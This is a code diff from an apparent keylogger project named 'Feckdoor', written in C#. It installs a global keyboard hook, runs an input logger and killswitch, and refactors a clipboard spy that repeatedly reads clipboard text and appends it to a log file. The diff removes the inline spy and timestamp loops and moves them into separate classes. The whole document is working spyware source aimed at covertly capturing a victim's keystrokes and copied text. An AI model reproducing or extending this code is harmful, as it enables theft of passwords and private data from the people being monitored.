@@ -17,6 +17,8 @@ namespace Feckdoor
 
 		private static InputLogger InputLog = null!;
 		private static KillswitchHandler Killswitch = null!;
+		private static TimestampAppender TimestampAdd = null!;
+		private static ClipboardSpy ClipSpy = null!;
 
 		private static bool disposed = false;
 
@@ -39,7 +41,7 @@ namespace Feckdoor
 
 				try
 				{
-					Log.Logger = new LoggerConfiguration().MinimumLevel.Debug().WriteTo.File(Config.TheConfig.ProgramLogFile, outputTemplate: Config.TheConfig.LogTemplate, buffered: true, flushToDiskInterval: TimeSpan.FromSeconds(1), fileSizeLimitBytes: 8388608, encoding: Encoding.UTF8, rollOnFileSizeLimit: true).CreateLogger();
+					Log.Logger = new LoggerConfiguration().MinimumLevel.Debug().WriteTo.File(Config.TheConfig.ProgramLogFile, outputTemplate: Config.TheConfig.LogTemplate, buffered: true, flushToDiskInterval: TimeSpan.FromMilliseconds(Config.TheConfig.LogFlushInterval), fileSizeLimitBytes: Config.TheConfig.LogRollingSize, encoding: Encoding.UTF8, rollOnFileSizeLimit: true).CreateLogger();
 				}
 				catch (Exception e)
 				{
@@ -63,16 +65,15 @@ namespace Feckdoor
 				AppDomain.CurrentDomain.ProcessExit += OnShutdown;
 				AppDomain.CurrentDomain.DomainUnload += OnShutdown;
 
-
 				// Initialize hooks
 				KeyboardHook.InstallHook();
 
 				// Initialize modules
 				InputLog = new InputLogger();
 				Killswitch = new KillswitchHandler();
+				TimestampAdd = new TimestampAppender();
+				ClipSpy = new ClipboardSpy();
 
-				// Task.Run(async () => await ClipboardSpy());
-				Task.Run(async () => await TimestampAdder());
 				Application.Run();
 			}
 			catch (Exception ex)
@@ -146,6 +147,8 @@ namespace Feckdoor
 				KeyboardHook.UninstallHook();
 				InputLog.Dispose();
 				Killswitch.Dispose();
+				TimestampAdd.Dispose();
+				ClipSpy.Dispose();
 				disposed = true;
 				Log.Information("Resource disposal fininshed. Bye!");
 				Application.Exit();
@@ -193,52 +196,6 @@ namespace Feckdoor
 			return false;
 		}
 
-		private async static Task ClipboardSpy()
-		{
-			while (true)
-			{
-				string text = Clipboard.GetText();
-				await File.AppendAllTextAsync(Config.TheConfig.ProgramLogFile, $"Clipboard spy str2: {text}{Environment.NewLine}");
-				if (ClipboardTextCache != text)
-				{
-					using (var writer = new StreamWriter(Config.TheConfig.InputLog.InputLogFile, true))
-					{
-						try
-						{
-							writer.WriteLine(Environment.NewLine);
-							writer.WriteLine("> Clipboard text changed");
-							writer.WriteLine("New content: " + text);
-						}
-						catch (Exception e)
-						{
-							await File.AppendAllTextAsync(Config.TheConfig.ProgramLogFile, $"Clipboard spy error: {e}{Environment.NewLine}");
-						}
-					}
-				}
-				ClipboardTextCache = text;
-				await Task.Delay(Config.TheConfig.InputLog.ClipboardSpyDelay);
-			}
-		}
 
-		private async static Task TimestampAdder()
-		{
-			while (true)
-			{
-				using (var writer = new StreamWriter(Config.TheConfig.InputLog.InputLogFile, true))
-				{
-					try
-					{
-						writer.WriteLine(Environment.NewLine);
-						writer.WriteLine($"--- {DateTime.Now.ToString(Config.TheConfig.InputLog.PlainText.TimestampFormat)} ---");
-						writer.WriteLine(Environment.NewLine);
-					}
-					catch (Exception e)
-					{
-						await File.AppendAllTextAsync(Config.TheConfig.ProgramLogFile, $"Timestamper error: {e}{Environment.NewLine}");
-					}
-				}
-				await Task.Delay(Config.TheConfig.InputLog.PlainText.TimestampDelay);
-			}
-		}
 	}
 }
